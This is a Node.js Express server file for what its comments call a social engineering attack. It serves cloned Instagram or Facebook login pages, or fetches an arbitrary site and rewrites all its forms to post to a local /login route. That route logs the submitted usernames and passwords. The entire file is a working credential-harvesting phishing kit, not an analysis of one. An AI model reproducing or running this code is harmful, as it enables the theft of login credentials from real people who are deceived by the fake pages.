const express = require('express');
const bodyparser = require('body-parser')
const rp = require('request-promise');
const parser = require('node-html-parser');
const fs = require('fs');
const app = express();

var page;

app.use(bodyparser.json());

app.use(bodyparser.urlencoded({
  extended: true
}));

/* Reads the data.json containing the info of the social engineering attack */
function getData(){
    return JSON.parse(fs.readFileSync('./data.json','utf8'));
}

/* Sets the page depending from the data inside the data.json */
async function getOption(data){
    if(data.option == 1){
        app.use(express.static('./pages/instagram/'));
        page = fs.readFileSync('./pages/instagram/index.html','utf8');
    } else if(data.option == 2){
        app.use(express.static('./pages/facebook/'));
        page = fs.readFileSync('./pages/facebook/index.html','utf8');
    } else {
        page = injectForm(await rp(data.url)).innerHTML;
    }
}

function injectAction(parent){
    for(var i = 0; i < parent.childNodes.length; i++){
        if(parent.childNodes[i].tagName == 'form'){
            parent.childNodes[i].removeAttribute('action');
            parent.childNodes[i].setAttribute('action','/login');
        } else {
            injectAction(parent.childNodes[i]);
        }
    }
}

function injectForm(html){
    var rootHTML = parser.parse(html);
    injectAction(rootHTML);
    return rootHTML;
}

app.get('/', function (req, res) {
    res.set('Content-Type', 'text/html');
    res.end(Buffer.from(page));
});

app.post('/login',function(req,res){
    console.log(req.body);
});

app.listen(3000,function(){
    getOption(getData());
});